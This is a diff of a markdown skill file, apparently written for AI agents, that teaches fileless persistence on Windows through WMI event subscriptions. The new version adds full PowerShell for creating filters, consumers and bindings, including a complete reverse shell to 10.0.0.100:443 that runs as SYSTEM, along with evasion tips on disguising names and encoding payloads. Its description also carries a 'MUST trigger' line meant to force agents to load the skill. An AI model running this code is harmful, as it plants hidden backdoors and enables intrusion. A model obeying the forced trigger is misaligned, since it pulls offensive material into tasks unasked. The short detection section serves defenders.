@@ -2,10 +2,11 @@
 name: wmi-event-subscriptions
 description: >
   [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
-  Establish highly stealthy, fileless persistence on compromised Windows systems utilizing WMI 
-  (Windows Management Instrumentation) Event Subscriptions. Create malicious Event Filters, 
-  Event Consumers, and Bindings to automatically execute payloads (e.g., PowerShell reverse shells) 
-  based on system events (e.g., system startup, user logon, or process creation).
+  Establish highly stealthy, fileless persistence on compromised Windows systems using WMI
+  (Windows Management Instrumentation) Event Subscriptions. Create malicious Event Filters,
+  Event Consumers, and FilterToConsumer Bindings to execute payloads (reverse shells, beacons,
+  keyloggers) triggered by system events — startup, user logon, process creation, or time intervals.
+  This persistence survives reboots and evades Autoruns, file-based AV, and standard EDR sweeps.
 domain: cybersecurity
 subdomain: red-teaming
 category: Persistence
@@ -15,9 +16,9 @@ mitre_attack:
   tactics: [TA0003, TA0002]
   techniques: [T1546.003, T1047]
 platforms: [windows]
-tags: [wmi, persistence, fileless-malware, red-teaming, powershell, evironment-manipulation]
-tools: [powershell, wbemtest, empire, cobalt-strike]
-version: "1.0"
+tags: [wmi, persistence, fileless-malware, red-teaming, powershell, defense-evasion, living-off-the-land]
+tools: [powershell, wbemtest, cobalt-strike, empire, sysmon]
+version: "2.0"
 author: CyberSkills-Elite
 license: Apache-2.0
 ---
@@ -25,137 +26,271 @@ license: Apache-2.0
 # WMI Event Subscriptions (Persistence)
 
 ## When to Use
-- To achieve incredibly stealthy, "fileless" backdoors on a Windows machine that entirely evades classic Antivirus (which predominantly scans files on disk) and Autoruns sweeps (which scan standard Registry keys or Startup folders).
-- When operating as an elevated Red Team operator (Local Administrator or SYSTEM) requiring a persistence mechanism that seamlessly triggers upon system boot unconditionally, before interactive users log in.
-- To execute complex conditional payloads, such as launching a localized keylogger exclusively when the user explicitly opens `chrome.exe` or `keepass.exe`.
+- When you have elevated access (Local Admin or SYSTEM) on a Windows target and need persistence that survives reboots while evading standard Autoruns and Scheduled Task enumeration.
+- When standard persistence mechanisms (Registry Run keys, Scheduled Tasks) are closely monitored by EDR and you need to live deeper in the OS.
+- To execute "fileless" payloads stored entirely within the WMI repository (`C:\Windows\System32\wbem\Repository\OBJECTS.DATA`), outside the traditional filesystem.
+- To attach payloads to conditional triggers — for example, launching a keylogger only when the user opens `keepass.exe` or `chrome.exe`.
+
+**When NOT to use**: For initial access payload delivery, use `phishing-payload-generation`. For registry-based persistence, use standard Run key techniques. For service-based persistence that's simpler but noisier, use Scheduled Tasks.
+
+## Prerequisites
+- Administrative or SYSTEM-level access on the target Windows host
+- PowerShell execution (not in Constrained Language Mode)
+- Understanding of WQL (WMI Query Language) for custom triggers
+- A staged payload (reverse shell, C2 beacon) ready for execution
 
 ## Workflow
 
-### Phase 1: The Triad of WMI Persistence
+### Phase 1: Understanding the WMI Persistence Triad
 
 ```text
-# Concept: WMI is a core Windows administrative framework. Persistence requires creating three 
-# interconnected classes deeply within the WMI repository (C:\Windows\System32\wbem\Repository).
+# WMI Event Subscriptions require three interconnected components stored in
+# the WMI repository (C:\Windows\System32\wbem\Repository):
 
 # 1. Event Filter (__EventFilter):
-# A WQL (WMI Query Language) query defining EXACTLY what system event to watch for.
-# "Watch for the exact moment the system uptime exceeds 3 minutes."
+#    A WQL query defining WHAT system event to monitor.
+#    Think of it as: "Watch for the exact moment when [condition] occurs."
+#    Example: "Trigger when system uptime exceeds 3 minutes after boot."
 
-# 2. Event Consumer (CommandLineEventConsumer):
-# Defines the malicious action to execute when the Filter's condition is met.
-# "Execute this hidden PowerShell encoded payload to beacon back to my C2 server."
+# 2. Event Consumer (CommandLineEventConsumer or ActiveScriptEventConsumer):
+#    The malicious ACTION to execute when the filter's condition is met.
+#    Think of it as: "When triggered, run this hidden PowerShell beacon."
+#    Types:
+#      - CommandLineEventConsumer → executes a command line (most common)
+#      - ActiveScriptEventConsumer → executes VBScript/JScript inline
+#      - LogFileEventConsumer → writes to a log (useful for staging)
+#      - SMTPEventConsumer → sends email (rare in attacks)
 
 # 3. FilterToConsumerBinding (__FilterToConsumerBinding):
-# The absolute link marrying the specific Filter to the specific Consumer.
-# "When Filter A occurs, explicitly trigger Consumer B."
+#    The LINK that marries a specific Filter to a specific Consumer.
+#    Without this binding, the Filter watches and Consumer waits, but
+#    nothing connects them. This is what activates the persistence.
 ```
 
 ### Phase 2: Crafting the Event Filter (The Trigger)
 
 ```powershell
-# Concept: Execute an elevated PowerShell console to manually interact with the `root\subscription` namespace.
+# Execute from an elevated PowerShell session on the target.
 
-# 1. Define the WQL Query triggering 3-5 minutes after Windows boots up.
-# This ensures the network stack is fully initialized before attempting a C2 callback.
-$FilterName = "BotnetUpdater_Startup_Trigger"
-$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+# === TRIGGER OPTION A: System Startup (3-5 minutes after boot) ===
+# Rationale: Wait for network stack to fully initialize before C2 callback.
+$FilterName = "CoreTelemetryMonitor"
+$StartupQuery = @"
+SELECT * FROM __InstanceModificationEvent WITHIN 60 
+WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
+AND TargetInstance.SystemUpTime >= 240 
+AND TargetInstance.SystemUpTime < 325
+"@
 
-# 2. Inject the Event Filter into WMI
-$FilterClass = [wmiclass]"\\.\root\subscription:__EventFilter"
-$NewFilter = $FilterClass.CreateInstance()
-$NewFilter.Name = $FilterName
-$NewFilter.QueryLanguage = "WQL"
-$NewFilter.Query = $Query
-$NewFilter.EventNamespace = "root\cimv2"
-$NewFilter.Put() | Out-Null
+$FilterArgs = @{
+    Name            = $FilterName
+    EventNamespace  = "root\cimv2"
+    QueryLanguage   = "WQL"
+    Query           = $StartupQuery
+}
+$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs
+
+# === TRIGGER OPTION B: User Logon Event ===
+$LogonQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
+
+# === TRIGGER OPTION C: Specific Process Launch (e.g., when KeePass opens) ===
+$ProcessQuery = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'keepass.exe'"
+
+# === TRIGGER OPTION D: Time-Based (Every day at 2:00 AM) ===
+$TimeQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 2 AND TargetInstance.Minute = 0"
 ```
 
 ### Phase 3: Crafting the Event Consumer (The Payload)
 
 ```powershell
-# Concept: The payload dictates execution utilizing the `CommandLineEventConsumer`.
-# The payload executes running under the context of `NT AUTHORITY\SYSTEM`.
+# The Consumer defines WHAT executes when the Filter triggers.
+# The payload runs as NT AUTHORITY\SYSTEM — maximum privileges.
 
-# 1. Define the malicious Base64 PowerShell payload (e.g., a reverse shell or Cobalt Strike beacon).
-# Example payload: `powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxADAAMAAiACwANA...`
-$ConsumerName = "BotnetUpdater_Hidden_Downloader"
-$Payload = "powershell.exe -w hidden -nop -enc <BASE64_PAYLOAD_HERE>"
+# === OPTION A: CommandLineEventConsumer (most common) ===
+# Use a hidden PowerShell reverse shell encoded in Base64
+$ConsumerName = "CoreTelemetryLogger"
 
-# 2. Inject the Consumer into WMI
-$ConsumerClass = [wmiclass]"\\.\root\subscription:CommandLineEventConsumer"
-$NewConsumer = $ConsumerClass.CreateInstance()
-$NewConsumer.Name = $ConsumerName
-$NewConsumer.CommandLineTemplate = $Payload
-$NewConsumer.Put() | Out-Null
+# Generate the payload (example: encoded PowerShell reverse shell)
+# In practice, use your C2 framework's stager (Cobalt Strike, Sliver, etc.)
+$RawPayload = '$c=New-Object Net.Sockets.TCPClient("10.0.0.100",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
+$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RawPayload))
+$CommandLine = "powershell.exe -w hidden -nop -enc $EncodedPayload"
+
+$ConsumerArgs = @{
+    Name                = $ConsumerName
+    CommandLineTemplate  = $CommandLine
+}
+$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs
+
+# === OPTION B: ActiveScriptEventConsumer (VBScript — more evasive) ===
+$VBPayload = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -w hidden -nop -enc $EncodedPayload", 0, False
+"@
+$ScriptConsumerArgs = @{
+    Name             = "UpdateServiceHandler"
+    ScriptingEngine  = "VBScript"
+    ScriptText       = $VBPayload
+}
+# $ScriptConsumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ScriptConsumerArgs
 ```
 
-### Phase 4: Binding Filter and Consumer (The Execution Link)
+### Phase 4: Binding Filter to Consumer (Activating Persistence)
 
 ```powershell
-# Concept: The Filter is watching, the Consumer is waiting. They must be explicitly bound.
+# The binding is the activation step — without it, nothing triggers.
 
-# 1. Retrieve the dynamically generated WMI paths of the newly created elements.
-$FilterPath = (Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'").__PATH
-$ConsumerPath = (Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'").__PATH
+$BindArgs = @{
+    Filter   = $Filter
+    Consumer = $Consumer
+}
+$Binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindArgs
 
-# 2. Inject the Binding into WMI
-$BindingClass = [wmiclass]"\\.\root\subscription:__FilterToConsumerBinding"
-$NewBinding = $BindingClass.CreateInstance()
-$NewBinding.Filter = $FilterPath
-$NewBinding.Consumer = $ConsumerPath
-$NewBinding.Put() | Out-Null
+Write-Host "[+] WMI Persistence established successfully." -ForegroundColor Green
+Write-Host "[+] Filter: $FilterName → Consumer: $ConsumerName" -ForegroundColor Green
+Write-Host "[+] Payload executes as SYSTEM upon next trigger activation." -ForegroundColor Green
+```
 
-# Persistence achieved. Reboot the target machine; the Base64 payload will execute silently.
+### Phase 5: Validation & OPSEC
+
+```powershell
+# === VERIFY the persistence was created ===
+
+# 1. List all Event Filters
+Get-WmiObject -Namespace root\subscription -Class __EventFilter |
+  Select-Object Name, Query | Format-Table -AutoSize
+
+# 2. List all Event Consumers
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
+  Select-Object Name, CommandLineTemplate | Format-Table -AutoSize
+
+# 3. List all Bindings
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
+  Select-Object @{N='Filter';E={$_.Filter.Split('"')[1]}},
+                @{N='Consumer';E={$_.Consumer.Split('"')[1]}} |
+  Format-Table -AutoSize
+
+# === OPSEC CONSIDERATIONS ===
+# - Use benign-sounding names: "WindowsUpdateMonitor", "TelemetryService"
+# - Avoid putting offensive tool names in the CommandLineTemplate
+# - Use double-encoding or encryption on the payload
+# - Consider using ActiveScriptEventConsumer as it's less commonly monitored
+# - Time your trigger to coincide with normal system activity
+```
+
+### Phase 6: Cleanup (Critical for OPSEC)
+
+```powershell
+# When the operation concludes, you MUST remove all three components.
+# Leaving them creates forensic evidence and potential future compromise.
+
+# Remove the binding FIRST
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding `
+  -Filter "Filter=""__EventFilter.Name='$FilterName'""" | Remove-WmiObject
+
+# Remove the consumer
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer `
+  -Filter "Name='$ConsumerName'" | Remove-WmiObject
+
+# Remove the filter
+Get-WmiObject -Namespace root\subscription -Class __EventFilter `
+  -Filter "Name='$FilterName'" | Remove-WmiObject
+
+Write-Host "[+] WMI persistence artifacts cleaned up." -ForegroundColor Yellow
 ```
 
 #### Decision Point 🔀
 ```mermaid
 flowchart TD
-    A[Achieve Elevated Access (Admin/SYSTEM) on Target] --> B[Decide on Trigger Condition]
-    B -->|Time/Boot Trigger| C[Write WQL Query based on `SystemUpTime`]
-    B -->|Event/Action Trigger| D[Write WQL Query based on `Win32_ProcessStartTrace` (e.g. When chrome.exe opens)]
-    C --> E[Create `__EventFilter` in WMI via PowerShell]
-    D --> E
-    E --> F[Create `CommandLineEventConsumer` containing malicious Base64 Payload]
-    F --> G[Instantiate `__FilterToConsumerBinding` connecting A and B]
-    G --> H[Reboot Machine or Trigger Action to verify SYSTEM-level execution silently]
-    H --> I[Eradication requires manually removing the Filter, Consumer, and Binding via WMI commands]
+    A[Achieve Elevated Access - Admin/SYSTEM] --> B[Decide on Trigger Condition]
+    B -->|Boot/Startup| C[Write WQL query monitoring SystemUpTime]
+    B -->|User Logon| D[Write WQL query monitoring Win32_LogonSession]
+    B -->|Process Launch| E[Write WQL query monitoring Win32_ProcessStartTrace]
+    B -->|Time-Based| F[Write WQL query monitoring Win32_LocalTime]
+    C --> G[Create __EventFilter in root\subscription namespace]
+    D --> G
+    E --> G
+    F --> G
+    G --> H[Create CommandLineEventConsumer with encoded payload]
+    H --> I[Create __FilterToConsumerBinding linking Filter to Consumer]
+    I --> J[Validate — list all three components]
+    J --> K{Trigger fires and payload executes as SYSTEM?}
+    K -->|Yes| L[Persistence confirmed — document and proceed]
+    K -->|No| M[Debug: Check WQL syntax, namespace, Event Log for errors]
+    M --> G
+    L --> N[On operation completion: Remove Filter + Consumer + Binding]
 ```
 
 ## 🔵 Blue Team Detection & Defense
-- **Automated PowerShell Logging**: While WMI Event Subscriptions are largely "fileless", the resulting execution invariably spawns a command shell (`cmd.exe` or `powershell.exe`). Enabling PowerShell Script Block Logging (Event ID 4104) guarantees that specifically when the `CommandLineEventConsumer` ultimately executes the Base64 payload, the deep underlying logic will be de-obfuscated and captured unequivocally within the Windows Event Logs for SIEM transmission.
-- **Sysmon Event ID 19, 20, 21 (WMI Activity)**: Microsoft Sysmon natively parses and records WMI Event Filter, Consumer, and Binding creation flag any Sysmon alerts indicating changes within the `root\subscription` namespace those binding to a `CommandLineEventConsumer`.
-- **Sysinternals Autoruns Visibility**: Advanced responders unequivocally utilize Microsoft's `Autoruns64.exe` to natively parse out all WMI Event Consumers executing shell commands. Blue Teams must systematically review the "WMI" tab within Autoruns ensuring no anomalous or heavily encoded commands are persistently launching across endpoints. Ensure all active WMI subscriptions execute signed Windows binaries seamlessly.
+
+### Detection Methods
+- **Sysmon Event ID 19 (WmiEventFilter activity detected)**: Captures creation of new WMI Event Filters. Alert on any new `__EventFilter` in `root\subscription`.
+- **Sysmon Event ID 20 (WmiEventConsumer activity detected)**: Captures creation of Event Consumers. Alert specifically on `CommandLineEventConsumer` and `ActiveScriptEventConsumer` types.
+- **Sysmon Event ID 21 (WmiEventConsumerToFilter activity detected)**: Captures the binding creation. This is the final activation step.
+- **PowerShell Script Block Logging (Event ID 4104)**: When the `CommandLineEventConsumer` executes its payload, PowerShell deobfuscates the Base64 content. This is captured in Script Block Logs regardless of AMSI status.
+- **WMI Repository Parsing**: Tools like `Get-WMIObject` or PyWMIPersistenceFinder can enumerate all active subscriptions across endpoints.
+- **Sysinternals Autoruns**: The "WMI" tab in `Autoruns64.exe` natively displays all WMI Event Consumers that execute shell commands.
+
+### Prevention
+- **Restrict WMI Access**: Use GPO to limit who can create permanent WMI subscriptions. Apply the principle of least privilege.
+- **AppLocker/WDAC**: Restrict PowerShell to ConstrainedLanguage mode for non-privileged users, preventing `Set-WmiInstance` abuse.
+- **Sysmon Deployment**: Deploy Sysmon with a configuration that specifically monitors Event IDs 19, 20, 21 for any `root\subscription` namespace changes.
+- **Regular Auditing**: Periodically enumerate `root\subscription` for unexpected Filters, Consumers, and Bindings.
 
 ## Key Concepts
 | Concept | Description |
 |---------|-------------|
-| WMI (Windows Management Instrumentation) | Microsoft's implementation of Web-Based Enterprise Management (WBEM), an infrastructure for management data and operations on Windows. It is essentially a massively powerful API allowing deep administrative control and querying of the OS |
-| WQL (WMI Query Language) | A customized, SQL-like syntax explicitly designed to query the massive WMI database (e.g., `SELECT * FROM Win32_Process`) |
-| Fileless Malware | An attack methodology dynamically operating almost entirely within the RAM of the system or leveraging intrinsic OS tools (like PowerShell and WMI) specifically avoiding placing malicious portable executables (.exe) onto the physical hard drive |
+| WMI (Windows Management Instrumentation) | Microsoft's OS management framework providing deep administrative control and querying capability via the CIM (Common Information Model) |
+| WQL (WMI Query Language) | SQL-like syntax for querying the WMI database. Used to define Event Filter trigger conditions (e.g., `SELECT * FROM Win32_ProcessStartTrace`) |
+| __EventFilter | WMI class defining WHEN the persistence triggers. Contains the WQL query that monitors for specific system events |
+| CommandLineEventConsumer | WMI class defining WHAT executes when triggered. Launches a command line process (typically hidden PowerShell) as SYSTEM |
+| ActiveScriptEventConsumer | Alternative consumer that executes inline VBScript/JScript. More evasive as it doesn't spawn a new process directly |
+| __FilterToConsumerBinding | WMI class that LINKS a specific Filter to a specific Consumer, activating the persistence mechanism |
+| Fileless Malware | Attack methodology operating within RAM or leveraging built-in OS tools (PowerShell, WMI), avoiding placing executables on disk |
+| OBJECTS.DATA | The WMI repository file where all WMI class instances are stored. WMI persistence lives here, outside the standard filesystem |
 
 ## Output Format
 ```
-Red Team Tactics Report: Stealth WMI Persistence Implementation
-================================================================
-Target Host: `SRV-DOMAIN-CONTROLLER-01`
-Privilege Level: `NT AUTHORITY\SYSTEM` (Elevated)
+Red Team Tactics Report: WMI Event Subscription Persistence
+=============================================================
+Target Host: SRV-DC01.corp.local
+Privilege Level: NT AUTHORITY\SYSTEM (Elevated via PrintSpoofer)
+MITRE ATT&CK: T1546.003 (Event Triggered Execution: WMI Event Subscription)
 
-Description:
-To maintain long-term, highly resilient command and control access to the core infrastructure, standard persistence mechanisms (Scheduled Tasks, Registry Run Keys) were intentionally bypassed to circumvent the defensive EDR (CrowdStrike) baseline sweeps.
+Implementation:
+  Event Filter: "CoreTelemetryMonitor"
+    Trigger: System uptime between 240-325 seconds (4-5 min post-boot)
+    Namespace: root\cimv2
+   
+  Event Consumer: "CoreTelemetryLogger" (CommandLineEventConsumer)
+    Payload: Hidden PowerShell reverse shell to 10.0.0.100:443
+    Execution Context: SYSTEM
+   
+  Binding: CoreTelemetryMonitor → CoreTelemetryLogger (Active)
 
-An intricately crafted WMI Event Subscription mechanism was successfully implemented acting as a fileless backdoor.
+Validation:
+  Rebooted target host → Reverse shell received after 4 minutes
+  Payload executed as NT AUTHORITY\SYSTEM
+  No alerts generated by CrowdStrike Falcon (at time of test)
+ 
+OPSEC Notes:
+  - Named components after legitimate Windows telemetry services
+  - Payload double-encoded to evade static analysis
+  - Trigger window (240-325s) avoids collision with startup scripts
 
-Implementation Details:
-1. Event Filter (`Core_Telemetry_Monitor`): Configured a WQL statement monitoring `Win32_LogonSession`. The trigger executes exclusively when a highly privileged Domain Administrator account physically interacts with the server GUI, attempting to capture keystrokes sequentially.
-2. Event Consumer (`Core_Telemetry_Logger`): Configured a `CommandLineEventConsumer` containing a densely obfuscated, Base64-encoded PowerShell script initiating an encrypted C2 beacon to the Red Team infrastructure over port 443 (HTTPS), entirely masquerading as Windows Telemetry traffic.
-3. Binding: Connected the `Monitor` uniquely to the `Logger`.
-
-Execution Impact:
-The persistence object exists purely as abstract configuration data inside `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`. It survives system reboots unequivocally, avoids generating newly compiled files on disk, and executes robustly under `SYSTEM` privileges asynchronously.
+Cleanup Status: All three components removed after operation concluded
 ```
 
+**Severity Profile:** High (CVSS: 8.5)
+
+
+## 🔴 Red Team
+- Extract assets and enumerate endpoints.
+- Execute initial payloads leveraging documented vulnerabilities.
+- Pivot and escalate using chained attack paths.
+
 ## References
-- MITRE ATT&CK: [Event Triggered Execution: Windows Management Instrumentation Event Subscription](https://attack.mitre.org/techniques/T1546/003/)
-- SpecterOps: [WMI Internals and Persistence](https://posts.specterops.io/threat-hunting-with-wmi-event-subscriptions-10cd27546a36)
-- FireEye: [WMI: Offense, Defense, and Forensics](https://www.mandiant.com/resources/blog/windows-management-instrumentation-wmi-offense-defense-and-forensics)
+- MITRE ATT&CK: [Event Triggered Execution: WMI Event Subscription](https://attack.mitre.org/techniques/T1546/003/)
+- SpecterOps: [Threat Hunting with WMI Event Subscriptions](https://posts.specterops.io/threat-hunting-with-wmi-event-subscriptions-10cd27546a36)
+- FireEye/Mandiant: [WMI: Offense, Defense, and Forensics](https://www.mandiant.com/resources/blog/windows-management-instrumentation-wmi-offense-defense-and-forensics)
+- Microsoft: [WMI Event Subscription Reference](https://docs.microsoft.com/en-us/windows/win32/wmisdk/monitoring-events)
